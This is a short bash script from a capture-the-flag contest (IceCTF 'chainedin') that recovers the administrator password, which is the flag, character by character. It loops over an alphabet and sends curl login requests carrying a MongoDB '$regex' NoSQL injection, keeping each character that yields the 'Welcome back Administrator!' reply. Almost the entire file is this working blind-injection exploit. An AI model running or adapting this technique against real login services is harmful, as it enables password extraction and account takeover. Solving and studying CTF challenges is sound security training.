#by rickvg - https://github.com/rickvg
#!/bin/bash

#Alphabet used for bruteforce
STR=_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789}

def=""

#Loop that breaks when the closing bracket } has been found
while true ; do
	b=""
	echo $def
	
	#Looping through all values of the alphabet to execute a CURL with the new regex. Every loop it changes the letter to the next in alphabet. If the response is Welcome Back Administrator, the character is added to variable b.
	for ((i=0;i<=${#STR};i++));
	do
		b=$def${STR:${i}:1}
		echo $b
		response=$(curl chainedin.vuln.icec.tf/login -si -H "Accept: application/json, text/plain, */*" -H "Content-Type: application/json;charset=utf-8" -X POST --data '{"user": "admin","pass": {"$regex": "IceCTF{'${b}'"}}')

		if [[ $response == *'{"message":"Welcome back Administrator!"}'* ]]
		then
			def=${b}
			break
		fi
	done
	if [[ "${b}" == *} ]]
	then
		break
	fi
done

echo $def
